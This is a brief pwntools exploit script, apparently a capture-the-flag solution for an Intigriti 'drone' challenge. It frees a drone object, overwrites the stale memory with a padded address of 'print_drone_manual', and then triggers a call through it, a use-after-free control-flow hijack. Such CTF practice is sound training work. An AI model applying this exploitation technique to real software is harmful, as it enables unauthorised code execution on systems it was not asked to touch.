import sys
sys.path.append('/home/ubuntu/pat/scripts/')
from pwn import *
from pwnfast import Pwn

context.terminal = ['tmux', 'splitw', '-v', '-p', '90']

PROG = './drone'

### ------------------ EXPLOIT ------------------ ###

r = Pwn(PROG, conn='uap.ctf.intigriti.io 1340')
# r = Pwn(PROG)

r.sla(b'option: ', b'1')

r.sla(b'option: ', b'2')
r.sla(b'retire: ', b'1')

r.sla(b'option: ', b'4')

pay = b'A' * 16
pay += p64(r.sym['print_drone_manual'])
r.sla(b'data: ', pay)

r.sla(b'option: ', b'3')
r.sla(b'route: ', b'1')

r.interactive()